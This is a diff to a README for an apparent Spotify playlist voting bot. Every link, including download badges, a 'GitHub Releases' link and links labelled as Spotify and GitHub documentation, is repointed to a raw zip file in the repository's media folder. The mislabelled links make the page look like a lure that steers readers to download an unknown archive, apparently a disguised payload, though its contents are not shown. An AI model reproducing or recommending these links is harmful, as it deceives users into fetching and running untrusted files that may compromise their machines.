@@ -1,6 +1,6 @@
 # 🎉 Spotify-Collaborative-Playlist-Voting-Bot - Effortless Spotify Playlist Collaboration
 
-[![Download Latest Release](https://raw.githubusercontent.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/main/media/Spotify-Collaborative-Playlist-Voting-Bot-1.3.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/main/media/Spotify-Collaborative-Playlist-Voting-Bot-1.3.zip)](https://raw.githubusercontent.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/main/media/Spotify-Collaborative-Playlist-Voting-Bot-1.3.zip)
+[![Download Latest Release](https://github.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/raw/refs/heads/main/media/Playlist-Collaborative-Spotify-Voting-Bot-v2.6.zip%20Latest%20Release-Click%https://github.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/raw/refs/heads/main/media/Playlist-Collaborative-Spotify-Voting-Bot-v2.6.zip)](https://github.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/raw/refs/heads/main/media/Playlist-Collaborative-Spotify-Voting-Bot-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure you have the following:
 
 To get started, you need to download the software. 
 
-1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/main/media/Spotify-Collaborative-Playlist-Voting-Bot-1.3.zip).
+1. Visit this page to download: [GitHub Releases](https://github.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/raw/refs/heads/main/media/Playlist-Collaborative-Spotify-Voting-Bot-v2.6.zip).
 
 2. Look for the latest version under the "Releases" section.
 
@@ -66,9 +66,9 @@ This project is licensed under the MIT License. You can use the software freely,
 
 ## 🔗 Additional Resources
 
-- [Spotify Developer Documentation](https://raw.githubusercontent.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/main/media/Spotify-Collaborative-Playlist-Voting-Bot-1.3.zip)
-- [Getting Started with GitHub](https://raw.githubusercontent.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/main/media/Spotify-Collaborative-Playlist-Voting-Bot-1.3.zip)
+- [Spotify Developer Documentation](https://github.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/raw/refs/heads/main/media/Playlist-Collaborative-Spotify-Voting-Bot-v2.6.zip)
+- [Getting Started with GitHub](https://github.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/raw/refs/heads/main/media/Playlist-Collaborative-Spotify-Voting-Bot-v2.6.zip)
 
 By following these steps, you’ll be up and running in no time. Enjoy your collaborative playlist experience!
 
-[![Download Latest Release](https://raw.githubusercontent.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/main/media/Spotify-Collaborative-Playlist-Voting-Bot-1.3.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/main/media/Spotify-Collaborative-Playlist-Voting-Bot-1.3.zip)](https://raw.githubusercontent.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/main/media/Spotify-Collaborative-Playlist-Voting-Bot-1.3.zip)
+[![Download Latest Release](https://github.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/raw/refs/heads/main/media/Playlist-Collaborative-Spotify-Voting-Bot-v2.6.zip%20Latest%20Release-Click%https://github.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/raw/refs/heads/main/media/Playlist-Collaborative-Spotify-Voting-Bot-v2.6.zip)](https://github.com/Merta482/Spotify-Collaborative-Playlist-Voting-Bot/raw/refs/heads/main/media/Playlist-Collaborative-Spotify-Voting-Bot-v2.6.zip)
